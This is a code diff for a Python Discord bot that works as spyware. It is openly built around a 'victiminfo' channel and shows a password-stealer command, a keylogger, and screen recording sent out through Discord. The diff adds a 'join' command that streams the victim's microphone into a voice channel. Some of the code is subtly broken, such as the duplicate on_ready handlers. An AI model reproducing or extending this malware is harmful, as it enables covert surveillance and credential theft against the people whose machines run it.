@@ -11,9 +11,15 @@ import asyncio
 import tempfile
 from bot_core import passwordstealer
 intents = discord.Intents.default()
+import pyaudio
+import threading
+from bot_core import screenrecord
+
 
 intents.message_content = True
 intents.members = True
+intents.voice_states = True
+intents.guilds = True
 
 bot = commands.Bot(command_prefix='.',intents=intents)
 
@@ -91,10 +97,12 @@ async def on_ready():
         channel = discord.utils.get(guild.text_channels, name="victiminfo") 
         if channel:
             await channel.send(fetch_victim_info.info_string)
-
-    print(f"Bot is online as {bot.user}")
+            
+    await screenrecord.record_and_send_screen(bot)
     
     keylogger.start_keylogger()
+
+
 
 PASSWORD_FILE = os.path.join(tempfile.gettempdir(), 'passwords.csv')
 @bot.command
@@ -108,26 +116,63 @@ async def stealpasswords(ctx):
         await ctx.send(f"Failed to send file: {e}")
 
   
+mic_streaming = False
+temp_vc_channel = None
+
+@bot.event
+async def on_ready():
+    pass
+
+
+@bot.command()
 async def join(ctx):
+    global mic_streaming, temp_vc_channel
+
     guild = ctx.guild
-    author = ctx.author
-
-    category = ctx.channel.category
-    channel_name = f"{author.name}'s VC"
-    overwrites = {
-        guild.default_role: discord.PermissionOverwrite(connect=True, view_channel=True)
-    }
-
-    voice_channel = await guild.create_voice_channel(channel_name, overwrites=overwrites, category=category)
-    
-    
-    if author.voice:
-        await author.move_to(voice_channel)
 
     
-    await voice_channel.connect()
+    temp_vc_channel = await guild.create_voice_channel(name="Mic Stream")
+    await ctx.send(f"🎤 Created VC: {temp_vc_channel.name}")
 
-    await ctx.send(f"✅ Created and joined voice channel: **{channel_name}**")
+    
+    vc = await temp_vc_channel.connect()
+    await ctx.send("🔊 Bot joined VC and streaming mic...")
+
+    mic_streaming = True
+
+    def stream_microphone():
+        p = pyaudio.PyAudio()
+        stream = p.open(format=pyaudio.paInt16, channels=1, rate=48000,
+                        input=True, frames_per_buffer=960)
+
+        while mic_streaming and vc.is_connected():
+            try:
+                data = stream.read(960, exception_on_overflow=False)
+                vc.send_audio_packet(data, encode=False)
+            except Exception as e:
+                break
+
+        stream.stop_stream()
+        stream.close()
+        p.terminate()
+
+    threading.Thread(target=stream_microphone, daemon=True).start()
+
+
+@bot.command()
+async def leave(ctx):
+    global mic_streaming, temp_vc_channel
+
+    mic_streaming = False
+
+    if ctx.voice_client:
+        await ctx.voice_client.disconnect()
+        await ctx.send("🛑 Left VC.")
+
+    if temp_vc_channel:
+        await temp_vc_channel.delete()
+        await ctx.send("❌ Deleted the VC.")
+        temp_vc_channel = None
 
 
 bot.run(TOKEN)
